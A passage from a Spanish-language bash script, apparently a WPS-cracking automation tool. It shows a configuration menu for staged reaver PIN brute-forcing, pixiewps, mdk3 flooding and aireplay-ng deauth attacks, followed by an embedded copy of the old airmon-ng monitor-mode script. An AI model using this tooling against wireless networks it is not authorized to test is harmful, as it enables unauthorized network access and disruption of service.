	22) echo -e "\033[36m\n$info Vuelva a probar WPS Pin 12345670 every X número de ciclos de reinicio.  $txtrst"
	read RETESTPIN
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RETESTPIN=$RETESTPINOLD/RETESTPIN=$RETESTPIN/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;


	c|C) if [[ -z $CHANNEL1 || -z $USE_R1 || -z $RX1 || -z $RY1 || -z $LIVE1 || -z $USE_LONG1 || -z $MDKLIVE || -z $PAUSE || -z $REAVER_COUNT || -z $MDK3_COUNT || -z $WASH_COUNT || -z $DAMP_MDK || -z $ADVAN_TIME || -z $USE_AIRE1 || -z $USE_AIRE0 || -z $USE_DHSMALL || -z $MACSEL || -z $USE_PIXIE || -z $USE_FIRSTPIN || -z $RETESTPIN ]]; then

		echo -e "\033[31m$warn Algo está mal - vuelva a intentarlo"
		sleep 1
		CONFIG_ADJUST_fn
		fi;;

	*) 	CONFIG_ADJUST_fn;;
esac

}

#~~~~~~~~~~~~~~~fin Manual de Manejo Config fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~Empezar config desplegable Empezar~~~~~~~~~~~~#

CONFIG_DROP_fn()
{

echo -e  "$info  Las inscripciones en el$yel VARMAC_CONFIG/$SOURCENAME$txtrst"
cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "CHANNEL1=")) {print " " $1 "\t" "Cero = salto de canal. Programa asignará canal(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_R1=")) {print " " $1 "\t" "Uso de -r x:y command con reaver(Stage I/II)"}}' 

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RX1=")) {print " " $1 "\t" "\t" "x en el -r x:y command con reaver(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RY1=")) {print " " $1 "\t" "\t" "y en el -r x:y command con reaver(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "LIVE1=")) {print " " $1 "\t" "reaver tiempo en vivo en seg(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_LONG1=")) {print " " $1 "\t" "El uso de largo reaver command - y/Y es recomendado(Stage I/II)" }}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDKTYPE1=")) {print " " $1 "\t" "Ver archivos de ayuda / de configuración para la lista de tipos de ataque(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDKLIVE=")) {print " " $1 "\t" "tiempo en segundos que mdk3 ataque estará activo(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "PAUSE=")) {print " " $1 "\t" "la recuperación del router y lavar escanear en segundos(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "REAVER_COUNT=")) {print " " $1 "\t" "reaver activación de temporizador de cuenta atrás(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDK3_COUNT=")) {print " " $1 "\t" "mdk3 activación de temporizador de cuenta atrás(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "WASH_COUNT=")) {print " " $1 "\t" "activación de temporizador de cuenta atrás washscan(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "DAMP_MDK=")) {print " " $1 "\t" "suprimir mdk3 si el router no se ha recuperado(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "ADVAN_TIME=")) {print " " $1 "\t" "reaver de detección previa a la actividad del router(Stage I)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_AIRE1=")) {print " " $1 "\t" "uso de aireplay-ng --fakeauth durante stage(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_AIRE0=")) {print " " $1 "\t" "uso de aireplay-ng --deauth durante(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_DHSMALL=")) {print " " $1 "\t" "usar --dhsmall con reaver ver comments pixiedust(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MACSEL=")) {print " " $1  "\t" "asignar la dirección MAC específica(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "ASSIGN_MAC=")) {print " " $1 "\t" "asignado la dirección MAC Si MACSEL=y/Y(Stage I)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_PIXIE=")) {print " " $1 "\t" "usar pixiewps durante wash exploración(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_FIRSTPIN=")) {print " " $1 "\t" "comprobar pin 12345670(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RETESTPIN=")) {print " " $1 "\t" "Frecuencia para volver a comprobar pin 12345670(Stage I/II)"}}'
}

#~~~~~~~~~~~~~fin config desplegable fin~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~~~~Empezar  airmon-ng viejo  Empezar~~~~~~~~~~~~~~~~~#

airmon-old_fn()

{

#!/bin/sh

USERID=""
IFACE=""
KISMET=/etc/kismet/kismet.conf
CH=$3; [ x$3 = "x" ] && CH=10
IFACE_FOUND="false"
MADWIFI=0
MAC80211=0
USE_IW=0
IW_SOURCE="http://wireless.kernel.org/download/iw/iw-0.9.15.tar.bz2"
IW_ERROR=""
UDEV_ISSUE=0

if [ -f "`which iw 2>&1`" ]
then
	USE_IW=1
fi

if [ "x$MON_PREFIX"="x" ]
then
MON_PREFIX="mon"
fi

PROCESSES="wpa_action\|wpa_supplicant\|wpa_cli\|dhclient\|ifplugd\|dhcdbd\|dhcpcd\|NetworkManager\|knetworkmanager\|avahi-autoipd\|avahi-daemon\|wlassistant\|wifibox"
PS_ERROR="invalid"

usage() {
	printf "usage: `basename $0` <start|stop|check> <interface> [channel or frequency]\n"
	echo
	exit
}

startStdIface() {
	iwconfig $1 mode monitor >/dev/null 2>&1
	if [ ! -z $2 ]
	then
	    if [ $2 -lt 1000 ]
	    then
		iwconfig $1 channel $2 >/dev/null 2>&1
	    else
		iwconfig $1 freq "$2"000000 > /dev/null 2>&1
	    fi
	fi
	iwconfig $1 key off >/dev/null 2>&1
	ifconfig $1 up
	printf " (monitor mode enabled)"
}


stopStdIface() {
	ifconfig $1 down >/dev/null 2>&1
	iwconfig $1 mode Managed >/dev/null 2>&1
	ifconfig $1 down >/dev/null 2>&1
	printf " (monitor mode disabled)"
}

getModule() {
    if [ -f "/sys/class/net/$1/device/driver/module/srcversion" ]
    then
        srcver1=`cat "/sys/class/net/$1/device/driver/module/srcversion"`
        for j in `lsmod | awk '{print $1}' | grep -v "^Module$"`
        do
            srcver2="`modinfo $j 2>/dev/null | grep srcversion | awk '{print $2}'`"
            if [ $srcver1 = "$srcver2" ]
            then
                MODULE=$j
                break
            fi
        done
    else
        MODULE=""
    fi
#    return 0
}

getDriver() {
   if [ -e "/sys/class/net/$1/device/driver" ]
   then
       DRIVER="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
       BUS="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
   else
       DRIVER=""
       BUS=""
   fi
   if [ x$(echo $DRIVER | grep ath5k) != "x" ]
   then
       DRIVER="ath5k"
   fi
   if [ x$(echo $DRIVER | grep ath9k) != "x" ]
   then
       DRIVER="ath9k"
   fi
}

scanProcesses() {
    match=`ps -A -o comm= | grep $PROCESSES | grep -v grep | wc -l`
    if [ $match -gt 0 -a x"$1" != xkill ]
    then
        printf "\n\n"
        echo "Encontrado $match procesos que podrían causar problemas."
        echo "Si airodump-ng, aireplay-ng o airtun-ng deja de funcionar después"
        echo "un corto período de tiempo, es posible que desee para matar (algo de) ellos!"
        echo -e "\nPID\tName"
    else
        if [ x"$1" != xkill ]
        then
            return
        fi
    fi

    if [ $match -gt 0 -a x"$1" = xkill ]
    then
        echo "Matar a todos aquellos procesos..."
    fi

    i=1
    while [ $i -le $match ]
    do
        pid=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $1}'`
        pname=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $2}'`
        if [ x"$1" != xkill ]
        then
            printf "$pid\t$pname\n"
        else
            kill $pid
        fi
        i=$(($i+1))
    done
}

checkProcessesIface() {
    if [ x"$1" = x ]
    then
        return
    fi

    match2=`ps -o comm= -p 1 2>&1 | grep $PS_ERROR | grep -v grep | wc -l`
    if [ $match2 -gt 0 ]
    then
	return
    fi

    for i in `ps auxw | grep $1 | grep -v "grep" | grep -v "airmon-ng" | awk '{print $2}'`
    do
        pname=`ps -o comm= -p $i`
        echo "Proceso con PID $i ($pname) se está ejecutando en la interfaz $1"
    done
}

getStack() {
    if [ x"$1" = x ]
    then
        return
    fi

    if [ -d /sys/class/net/$1/phy80211/ ]
    then
        MAC80211=1
    else
        MAC80211=0
    fi
}

#necesita ejecutar getDriver $iface antes de la getChipset
getChipset() {
    if [ x"$1" = x ]
    then
        return
    fi

    CHIPSET="Unknown "

    if [ x$DRIVER = "xOtus" -o x$DRIVER = "xarusb_lnx" -o x$DRIVER = "xar9170" ]
    then
	CHIPSET="AR9001U"
    fi

    if [ x$DRIVER = "xzd1211rw" -o x$DRIVER = "xzd1211rw_mac80211" ]
    then
        CHIPSET="ZyDAS 1211"
    fi

    if [ x$DRIVER = "xacx" -o x$DRIVER = "xacx-mac80211" -o x$DRIVER = "xacx1xx" ]
    then
        CHIPSET="TI ACX1xx"
    fi

    if [ x$DRIVER = "adm8211" ]
    then
        CHIPSET="ADMtek 8211"
    fi

    if [ x$DRIVER = "xat76_usb" ]
    then
        CHIPSET="Atmel   "
    fi

    if [ x$DRIVER = "xb43" -o x$DRIVER = "xb43legacy" -o x$DRIVER = "xbcm43xx" ]
    then
        CHIPSET="Broadcom"
    fi

    if [ x$DRIVER = "xprism54" -o x$DRIVER = "xp54pci" -o x$DRIVER = "xp54usb" ]
    then
        CHIPSET="PrismGT "
    fi

    if [ x$DRIVER = "xhostap" ]
    then
        CHIPSET="Prism 2/2.5/3"
    fi

    if [ x$DRIVER = "xr8180" -o x$DRIVER = "xrtl8180" ]
    then
        CHIPSET="RTL8180/RTL8185"
    fi

    if [ x$DRIVER = "xr8187" -o x$DRIVER = "xrtl8187" ]
    then
        CHIPSET="RTL8187 "
    fi

    if [ x$DRIVER = "xrt2570" -o x$DRIVER = "xrt2500usb" ]
    then
        CHIPSET="Ralink 2570 USB"
    fi

    if [ x$DRIVER = "xrt2400" -o x$DRIVER = "xrt2400pci" ]
    then
        CHIPSET="Ralink 2400 PCI"
    fi

    if [ x$DRIVER = "xrt2500" -o x$DRIVER = "xrt2500pci" ]
    then
        CHIPSET="Ralink 2560 PCI"
    fi

    if [ x$DRIVER = "xrt61" -o x$DRIVER = "xrt61pci" ]
    then
        CHIPSET="Ralink 2561 PCI"
    fi

    if [ x$DRIVER = "xrt73" -o x$DRIVER = "xrt73usb" ]
    then
        CHIPSET="Ralink 2573 USB"
    fi

    if [ x$DRIVER = "xipw2100" ]
    then
        CHIPSET="Intel 2100B"
    fi

    if [ x$DRIVER = "xipw2200" ]
    then
        CHIPSET="Intel 2200BG"
    fi

    if [ x$DRIVER = "xipw3945" -o x$DRIVER = "xipwraw" -o x$DRIVER = "xiwl3945" ]
    then
        CHIPSET="Intel 3945ABG"
    fi

    if [ x$DRIVER = "xipw4965" -o x$DRIVER = "xiwl4965" ]
    then
        CHIPSET="Intel 4965AGN"
    fi

    if [ x$DRIVER = "xiwlagn" ]
    then
        CHIPSET="Intel 4965/5xxx"
    fi

    if [ x$DRIVER = "xath_pci" -o x$DRIVER = "xath5k" -o x$DRIVER = "xath9k" ]
    then
        CHIPSET="Atheros "
    fi

    if [ x$DRIVER = "xorinoco" ]
    then
        CHIPSET="Hermes/Prism"
    fi
}

getPhy() {
    PHYDEV=""
    if [ x"$1" = x ]
    then
        return
    fi

    if [ x$MAC80211 = "x" ]
    then
        return
    fi

    PHYDEV="`ls -l "/sys/class/net/$1/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
}

getNewMon() {
    i=0

    while [ -d /sys/class/net/$MON_PREFIX$i/ ]
    do
        i=$(($i+1))
    done

    MONDEV="$MON_PREFIX$i"
}

if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	echo Run it as root ; exit ;
fi

iwpriv > /dev/null 2> /dev/null ||
  { echo Wireless tools not found ; exit ; }

if [ x"$1" = xcheck ] || [ x"$1" = xstart ]
then
    scanProcesses
    for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
    do
#         getModule $iface
#         getDriver $iface
        checkProcessesIface $iface
    done

    if [ x"$2" = xkill ]
    then
        scanProcesses "$2"
    fi
    if [ x"$1" = xcheck ]
    then
        exit
    fi
fi

printf "\n\n"

if [ $# -ne "0" ]
then
    if [ x$1 != "xstart" ] && [ x$1 != "xstop" ]
    then
        usage
    fi

    if [ x$2 = "x" ]
    then
        usage
    fi
fi

SYSFS=0
if [ -d /sys/ ]
then
    SYSFS=1
fi

printf "Interface\tChipset\t\tDriver\n\n"


for iface in `ifconfig -a 2>/dev/null | egrep UNSPEC | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/'`
do

 if [ x"`iwpriv $iface 2>/dev/null | grep ipwraw-ng`" != "x" ]
 then
        printf "$iface\t\tIntel 3945ABG\tipwraw-ng"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
        then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_abg" >>$KISMET
                startStdIface $iface $CH
                iwconfig $iface rate 1M 2> /dev/null >/dev/null
                iwconfig $iface txpower 16 2> /dev/null >/dev/null
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
        then
                stopStdIface $iface
                iwconfig $iface txpower 15 2> /dev/null >/dev/null
                iwconfig $iface rate 54M 2> /dev/null >/dev/null
        fi
        echo
        continue
 fi

 if [ -e "/proc/sys/dev/$iface/fftxqmin" ]
 then
    MADWIFI=1
    ifconfig $iface up
    printf "$iface\t\tAtheros\t\tmadwifi-ng"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        IFACE=`wlanconfig ath create wlandev $iface wlanmode monitor -bssid | grep ath`
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=madwifi_g,$iface,Atheros" >>$KISMET
        ifconfig $iface up 2>/dev/null >/dev/null
        if [ $CH -lt 1000 ]
        then
            iwconfig $IFACE channel $CH 2>/dev/null >/dev/null
        else
            iwconfig $IFACE freq "$CH"000000 2>/dev/null >/dev/null
        fi
        ifconfig $IFACE up 2>/dev/null >/dev/null
        UDEV_ISSUE=$?
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
            echo "$iface no soporta 'stop', hacerlo en la interfaz eth"
    fi
    echo
    continue
 fi
done

if [ $MADWIFI -eq 1 ]
then
	sleep 1s
fi

for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
do
 getModule  $iface
 getDriver  $iface
 getStack   $iface
 getChipset $DRIVER


 if [ x$MAC80211 = "x1" ]
 then
    getPhy $iface
    getNewMon
    printf "$iface\t\t$CHIPSET\t$DRIVER - [$PHYDEV]"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        if [ $USE_IW = 1 ]
        then
            IW_ERROR=`iw dev $iface interface add $MONDEV type monitor 2>&1 | grep "nl80211 not found"`
            if [ x$IW_ERROR = "x" ]
            then
                sleep 1s
		if [ ! -z $3 ]
                then
            	    if [ $3 -lt 1000 ]
            	    then
                	iwconfig $MONDEV channel $3 >/dev/null 2>&1
            	    else
                	iwconfig $MONDEV freq "$3"000000 >/dev/null 2>&1
            	    fi
            	fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(modo de monitor activado en $MONDEV)"
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
                then
                    echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                    sleep 1s
                    if [ $3 -lt 1000 ]
                    then
                        iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                    else
                        iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                    fi
                    ifconfig $MONDEV up
                    printf "\n\t\t\t\t(modo de monitor activado en $MONDEV)"
                else
                    printf "\n\nERROR: nl80211 apoyo está deshabilitada en su kernel.\nPor favor, vuelva a compilar su kernel con nl80211 apoyo habilitado.\n"
                fi
            fi
        else
            if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
            then
                echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                sleep 1s
                if [ $3 -lt 1000 ]
                then
                    iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                else
                    iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(modo de monitor activado en $MONDEV)"
            else
                printf "\n\nERROR: Ni los enlaces de interfaz sysfs ni el comando iw está disponible.\nPor favor, descargue e instale iw desde\n$IW_SOURCE\n"
            fi
        fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        z="`echo $iface | cut -b -${#MON_PREFIX}`"
        if [ x$z = "x$MON_PREFIX" ]
        then
            if [ $USE_IW = 1 ]
            then
                IW_ERROR=`iw dev "$iface" interface del 2>&1 | grep "nl80211 not found"`
                if [ x$IW_ERROR = "x" ]
                then
                    printf " (removed)"
                else
                    if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                    then
                        echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                        printf " (removed)"
                    else
                        printf "\n\nERROR: nl80211 apoyo está deshabilitada en su kernel.\nPor favor, vuelva a compilar su kernel with nl80211 apoyo habilitado.\n"
                fi
                fi
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                then
                    echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                    printf " (removed)"
                else
                    printf "\n\nERROR: Ni los enlaces de interfaz sysfs ni el comando iw está disponible.\nPor favor, descargue e instale iw desde\n$IW_SOURCE\n"
                fi
	    fi
        else
            ifconfig $iface down
            iwconfig $iface mode managed
            printf "\n\t\t\t\t(modo monitor deshabilitado)"
        fi
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xorinoco" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_rid`" != "x" ] || [ x"`iwpriv $iface 2>/dev/null | grep dump_recs`" != "x" ]
 then
    printf "$iface\t\tHermesI\t\torinoco"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=orinoco,$iface,HermesI" >>$KISMET
        if [ $CH -lt 1000 ]
        then
            iwconfig $iface mode Monitor channel $CH >/dev/null 2>&1
        else
            iwconfig $iface mode Monitor freq "$CH"000000 >/dev/null 2>&1
        fi
        iwpriv $iface monitor 1 $CH >/dev/null 2>&1
        ifconfig $iface up
        printf " (modo monitor deshabilitado)"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        ifconfig $iface down
        iwpriv $iface monitor 0 >/dev/null 2>&1
        iwconfig $iface mode Managed >/dev/null 2>&1
        printf " (modo monitor deshabilitado)"
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xipw2100" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_crc_check`" != "x" ]
 then
    printf "$iface\t\tIntel 2100B\tipw2100"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=ipw2100,$iface,Centrino_b" >>$KISMET
        startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        stopStdIface $iface
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xarusb_lnx" ] || [ x$DRIVER = "Otus" ]
 then
    printf "$iface\t\tAR9001USB\tOtus"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
	echo "El modo monitor aún no soportado"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
	stopStdIface $iface
    fi
    echo
    continue
 fi  

 if [ x$DRIVER = "xipw2200" ] || [ x"`iwpriv $iface 2>/dev/null | grep sw_reset`" != "x" ]
 then
    MODINFO=`modinfo ipw2200  2>/dev/null | awk '/^version/ {print $2}'`
    if { echo "$MODINFO" | grep -E '^1\.0\.(0|1|2|3)$' ; }
    then
    	echo "El modo monitor no compatible, por favor, actualice"
    else
	printf "$iface\t\tIntel 2200BG\tipw2200"
	if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
	then
	    cp $KISMET~ $KISMET 2>/dev/null &&
	    echo "source=ipw2200,$iface,Centrino_g" >>$KISMET
	    startStdIface $iface $CH
	fi
	if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
	then
	    stopStdIface $iface
	fi

    	if { echo "$MODINFO" | grep -E '^1\.0\.(5|7|8|11)$' ; }
	then
		printf " (Advertencia: mala versión del módulo, debe actualizar)"
	fi
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xcx3110x" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_backscan`" != "x" ]
 then
     printf "$iface\t\tNokia 770\t\tcx3110x"
     if [ x$1 = "xstart" ] || [ x$1 = "xstop" ]
     then
     	printf " (Activar el modo de monitor / desactivar aún no soportado)"
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xipw3945" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_preamble | grep -v set_crc_check`" != "x" ]
  then
        printf "$iface\t\tIntel 3945ABG\tipw3945"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
         then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_g" >>$KISMET
                startStdIface $iface $CH
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
         then
                stopStdIface $iface
        fi
        echo
        continue
 fi


 if [ x"`iwpriv $iface 2>/dev/null | grep inact_auth`" != "x" ]
 then
     if [ -e "/proc/sys/net/$iface/%parent" ]
     then
        printf "$iface\t\tAtheros\t\tmadwifi-ng VAP (parent: `cat /proc/sys/net/$iface/%parent`)"
	if [ x$2 = x$iface ] && [ x$1 = "xstop" ]
	then
		wlanconfig $iface destroy
		printf " (VAP destroyed)"
	fi
	if [ x$1 = "xstart" ]
	then
		if [ $iface = "$IFACE" ]
		then
			printf " (modo monitor habilitado)"
		fi
		if [ x$2 = x$iface ]
		then
			printf " (VAP No se puede poner en modo monitor)"
		fi
	fi

	echo ""
        continue

     fi
     printf "$iface\t\tAtheros\t\tmadwifi"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=madwifi_g,$iface,Atheros" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xprism54" ] || [ x"`iwpriv $iface 2>/dev/null | grep getPolicy`" != "x" ]
 then
     printf "$iface\t\tPrismGT\t\tprism54"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=prism54g,$iface,Prism54" >>$KISMET
         ifconfig $iface up
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface set_prismhdr 1 >/dev/null 2>&1
         printf " (modo monitor habilitado)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xhostap" ] || [ x"`iwpriv $iface 2>/dev/null | grep antsel_rx`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\tHostAP"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=hostap,$iface,Prism2" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface monitor_type 1 >/dev/null 2>&1
         ifconfig $iface up
         printf " (modo monitor habilitado)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xwlan-ng" ] || [ x"`wlancfg show $iface 2>/dev/null | grep p2CnfWEPFlags`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\twlan-ng"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=wlanng,$iface,Prism2" >>$KISMET
         wlanctl-ng $iface lnxreq_ifstate ifstate=enable >/dev/null
         wlanctl-ng $iface lnxreq_wlansniff enable=true channel=$CH \
                           prismheader=true wlanheader=false \
                           stripfcs=true keepwepflags=true >/dev/null
         echo p2CnfWEPFlags=0,4,7 | wlancfg set $iface
         ifconfig $iface up
         printf " (modo monitor habilitado)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         ifconfig $iface down
         wlanctl-ng $iface lnxreq_wlansniff enable=false  >/dev/null
         wlanctl-ng $iface lnxreq_ifstate ifstate=disable >/dev/null
         printf " (modo monitor habilitado)"
     fi
     echo
     continue
 fi


 if [ x$SYSFS = "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" != "x" ]
 then
    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt61`" != "x" ]
    then
    	printf "$iface\t\tRalink 2561 PCI\trt61"
    fi

    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt73`" != "x" ]
    then
        printf "$iface\t\tRalink 2573 USB\trt73"
    fi

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi
    echo
    continue

 fi


 if [ x$DRIVER = "xrt61" ]
 then
    printf "$iface\t\tRalink 2561 PCI\trt61"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt73" ]
 then
    printf "$iface\t\tRalink 2573 USB\trt73"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt2500" ] || [ x"`iwpriv $iface 2>/dev/null | grep bbp`" != "x" ]
 then
     printf "$iface\t\tRalink 2560 PCI\trt2500"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


